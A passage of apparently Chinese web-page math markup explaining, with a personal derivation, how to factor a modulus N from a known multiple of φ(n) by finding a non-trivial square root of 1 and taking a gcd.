display="block"><semantics><mrow><mtext>我们可以知道：</mtext><mi>k</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>2</mn><mi>x</mi></msup><mo>∗</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mspace linebreak="newline"></mspace><mtext>每一次分解时：随机取一个数</mtext><mi>w</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mi>N</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo><mspace linebreak="newline"></mspace><mtext>计算数</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msup><mi>w</mi><mrow><msup><mn>2</mn><mi>s</mi></msup><mo>∗</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mspace width="1em"/><mi>f</mi><mi>o</mi><mi>r</mi><mspace width="1em"/><mi>s</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1...</mn><mi>u</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>l</mi><mspace width="1em"/><msub><mi>a</mi><mn>1</mn></msub><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>当结束后如果</mtext><mi>s</mi><mo>=</mo><mn>0</mn><mtext>则说明算法失效，一般为重新选取</mtext><mi>w</mi><mtext>。</mtext><mspace linebreak="newline"></mspace><mtext>计算</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>≡</mo><msup><mi>w</mi><mrow><msup><mn>2</mn><mrow><mi>s</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>保证</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>≢</mo><mo>±</mo><mn>1</mn><mtext>，则</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>就是</mtext><mi>N</mi><mtext>的一个分解。</mtext><mspace linebreak="newline"></mspace><mtext>由于一开始</mtext><mi>N</mi><mtext>不止有两个素数，所以这里需要判断一下分解出来的是不是素数。</mtext></mrow><annotation encoding="application/x-tex">我们可以知道：k\phi(n)=2^x*gift\\每一次分解时：随机取一个数w\in[2,N-2]\\计算数a_1=w^{2^s*gift}\mod N\quad for\quad s=0,1... until\quad a_1\equiv1\mod N\\当结束后如果s=0则说明算法失效，一般为重新选取w。\\计算a_2\equiv w^{2^{s-1}*gift}\mod N\\保证a_2\not\equiv\pm1，则gcd(N,a_2+1)就是N的一个分解。\\由于一开始N不止有两个素数，所以这里需要判断一下分解出来的是不是素数。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">数</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.92998em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.92998em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">束</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">失</span><span class="mord cjk_fallback">效</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">般</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">重</span><span class="mord cjk_fallback">新</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">取</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0369199999999998em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0369199999999998em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">证</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">±</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">始</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">止</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span></span></span></span></span></p><p>个人理解：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>当</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mtext>时，</mtext><msub><mi>a</mi><mn>1</mn></msub><mtext>就是模</mtext><mi>N</mi><mtext>下的平凡平方根</mtext><mspace linebreak="newline"></mspace><mtext>通过计算我们知道</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>≡</mo><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>因为</mtext><mi>N</mi><mtext>是合数，只要</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>≢</mo><mo>±</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mtext>，则</mtext><msub><mi>a</mi><mn>2</mn></msub><mtext>称为模</mtext><mi>N</mi><mtext>下的非平凡平方根</mtext><mspace linebreak="newline"></mspace><mtext>（这里只需要判断</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>≢</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mo separator="true">,</mo><mtext>因为出计算</mtext><msub><mi>a</mi><mn>1</mn></msub><mtext>时已经计算过一遍</mtext><msub><mi>a</mi><mn>2</mn></msub><mtext>不等于</mtext><mn>1</mn><mtext>了</mtext><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>得</mtext><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>−</mo><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>得</mtext><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>N</mi><mtext>，因为</mtext><mi>N</mi><mtext>为合数</mtext><mspace linebreak="newline"></mspace><mtext>得</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo>=</mo><mi>x</mi><mtext>或者</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo>=</mo><mi>x</mi><mtext>，这里</mtext><mi>x</mi><mtext>指</mtext><mi>k</mi><mi>N</mi><mtext>中的一个因数</mtext><mspace linebreak="newline"></mspace><mtext>那么我们通过求解</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>或者</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>就可以得到</mtext><mi>N</mi><mtext>的分解了</mtext><mspace linebreak="newline"></mspace><mtext>（所以算法中</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>中的</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mtext>改成</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mtext>也是可行的）</mtext></mrow><annotation encoding="application/x-tex">当a_1\equiv1\mod 时，a_1就是模N下的平凡平方根\\通过计算我们知道a_1\equiv a_2^2\equiv1\mod N\\因为N是合数，只要a_2\not\equiv\pm1\mod N，则a_2称为模N下的非平凡平方根\\（这里只需要判断a_2\not\equiv1\mod N,因为出计算a_1时已经计算过一遍a_2不等于1了)\\得a_2^2-1\equiv(a_2+1)*(a_2-1)\equiv0\mod N\\得(a_2+1)*(a_2-1)=kN，因为N为合数\\得a_2+1=x或者a_2-1=x，这里x指kN中的一个因数\\那么我们通过求解gcd(N,a_2+1)或者gcd(N,a_2-1)就可以得到N的分解了\\（所以算法中gcd中的a_2+1改成a_2-1也是可行的）</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">当</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">凡</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">根</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">要</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span 